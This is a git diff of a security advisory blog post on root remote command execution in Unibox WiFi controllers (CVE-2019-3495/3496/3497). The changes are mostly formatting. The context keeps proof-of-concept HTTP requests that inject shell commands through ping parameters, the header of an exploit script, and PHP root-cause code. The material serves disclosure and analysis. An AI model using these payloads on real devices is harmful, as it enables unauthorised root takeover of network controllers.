@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "[0-day] Multiple Root RCE in Unibox Wifi Access Controller 0.x - 3.x"
+title:  "Unibox Wifi Access Controller - Multiple Remote Command Execution Vulnerabilities"
 tagline: Wifi-soft Unibox Controller Vulnerability Report
 tag: advisory
 excerpt_separator: <!--more-->
@@ -12,13 +12,15 @@ Following map shows the approximate number of devices affected globally:
 
 ![map](/assets/images/unibox/map.png)
 
-### Product Description
+### **Product Description**
 [Unibox Controller][0] is a fast-paced, reliable and scalable network controller for all Large & Small venues. It can be installed in any public venue like hotels, cafes, schools/colleges, hospitals, shopping malls, travel venues and even private offices to control, manage and monitor Internet access.
 
 It is designed to work with access points from any vendor and is extremely easy to configure and deploy in the network. It comes in different models ranging from 50 to 5,000 concurrent users so it can be deployed to manage a network of any scale. UniBox works seamlessly with UniMax access points making it really easy to deploy and manage these access points centrally from a single console.
 
-### Affected Versions : 0.x - 3.x
-### Vulnerable Instances:
+### **Affected Versions**
+ - Unibox Wifi Access Controller 0.x - 3.x
+
+### **Vulnerable Instances:**
 
 #### Unibox 0.x - 2.x 
 
@@ -28,16 +30,15 @@ It is designed to work with access points from any vendor and is extremely easy 
 #### Unibox 3.x
 * /tools/controller/diagnostic_tools_controller, **[POST] pingIPAddress CVE-2019-3496**
 
-### Proof of Concept:
+### **Proof of Concept:**
 
 **Note:** *All session IDs and cookies are omitted to limit the damage, any credentials required to exploit the mention vulnerabilities are hardcoded and can be obtained without any sort of authentication as well (O yea, more vulns are still there and yes they have default admin credentials). If product owners are reading this and are concerned about the credibility of POCs, you can put a comment here and I can share the exploit with credentials, but I don't think that would be required anyway.*
 
 
-### POC Exploit - CVE-2019-3495
+> CVE-2019-3495.py
 
 ```python
 #!/usr/bin/env python
-
 # Exploit Author: Sahil Dhar (Twitter: @0x401)
 # Desc: Unibox 2.x Remote Command Execution via Arbitrary file upload Exploit
 
@@ -95,7 +96,7 @@ if __name__=='__main__':
 ![poc_2](/assets/images/unibox/2.png)
 
 
-### POC - CVE-2019-3497
+> POC - CVE-2019-3497
 
 ```markdown
 POST /tools/ping HTTP/1.1
@@ -116,7 +117,7 @@ pingaction=1&address=127.0.0.1%0asudo /usr/local/unibox-0.9/scripts/exeCommand.s
 ![poc_1](/assets/images/unibox/1.png)
 
 
-### POC - CVE-2019-3496
+> POC - CVE-2019-3496
 
 ```markdown
 POST /tools/controller/diagnostic_tools_controller HTTP/1.1
@@ -138,13 +139,11 @@ action=ping&pingIPAddress=127.0.0.1%0asudo /usr/local/unibox/scripts/exeCommand.
 
 [0]: http://wifi-soft.com/unibox-controller/
 
-### Root Cause Analysis
-
+### **Root Cause Analysis**
 Though the vulnerabilities discussed above are pretty straigh forward to exploit using Blackbox testing approach, but having a look at the code can open a whole new world of learning and developer mindset to us. 
 
-#### **CVE-2019-3495** - Unibox 0.x-2.x
-
-> network/mesh/edit-nds.php:57
+> CVE-2019-3495 - Unibox 0.x-2.x
+>> network/mesh/edit-nds.php:57
 
 ```php
 if ($_POST['sent'] && $_FILES['file']['name']) {
@@ -165,9 +164,8 @@ By looking at the code, one can learn two things first a vulnerable file upload 
 We can conclude the reason why they are allowing any file to be uploaded by looking at the comment `Person was using advanced mode, and posted a file to us` and realize that they are allowing some "advanced users" to upload any files. Well there are no Advanced users but hardcoded credentials which also does not validate Admin user's authentication.
 
 
-#### **CVE-2019-3496** - Unibox 3.x
-
-> tools/controller/diagnostic_tools_controller.php:45
+> CVE-2019-3496 - Unibox 3.x
+>> tools/controller/diagnostic_tools_controller.php:45
 
 ```php
 if($action == 'ping') {
@@ -240,9 +238,8 @@ public function testPing($pingAddress) {
 ```
  The code for `DiagonosticTools::testPing()` is pretty straighforward which simply concatenates the userinput `$_REQUEST['pingIPAddress']` to the `ping` command and executes via PHP's `shell_exec()` function, which also gives an advantages to the attacker to use shell features if required.
 
-#### **CVE-2019-3497** - Unibox 0.x - 2.x
-
-> tools/ping.php
+> CVE-2019-3497 - Unibox 0.x - 2.x
+>> tools/ping.php
 
 ```php
 $pingCount = 3;
@@ -270,8 +267,10 @@ if ($_REQUEST['address']) {
 After looking at the code of Unibox 3.x and 2.x devices, one can realize that the origin of remote command injection vulnerability is from mistakes of the past, where developer didn't realize the actual use of PHP's `trim()` function and kept on using it even after doing the complete code revamp for Unibox 3.x devices.
 
 
-### Vendor Response Timeline
-* **4/10/2018** - Sent inital email. - No response
-* **12/10/2018** - Sent an email, included CEO's, CTO's and any other support/marketting email address I can find to discuss about the vulnerability. - No response
-* **31/12/2018** - Sent another email via their online contact form. - No response
-* **5/1/2019** - Public Disclosure :)
+### **Timeline**
+
+|Date|Status|
+|:---|:---|
+|4-OCT-2018|Reported to vendor|
+|31-NOV-2018|Sent another email, but no response from vendor|
+|5-JAN-2019|Public disclosure|
